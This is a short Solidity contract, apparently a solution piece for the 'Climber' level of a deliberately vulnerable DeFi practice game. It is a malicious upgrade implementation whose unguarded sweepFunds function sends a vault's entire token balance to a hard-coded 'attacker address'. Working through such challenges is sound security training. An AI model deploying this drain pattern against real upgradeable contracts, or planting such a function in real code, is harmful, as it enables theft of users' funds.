// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NewClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    // existing state variables are not used

    // inialize has already been run meaning it cannot be done again

    // @dev transfers all DVT tokens to attacker address
    function sweepFunds() external {
        IERC20 token = IERC20(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
        require(token.transfer(0x90F79bf6EB2c4f870365E785982E1f101E93b906, token.balanceOf(address(this))), "Transfer failed"); // transfer to attacker address
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
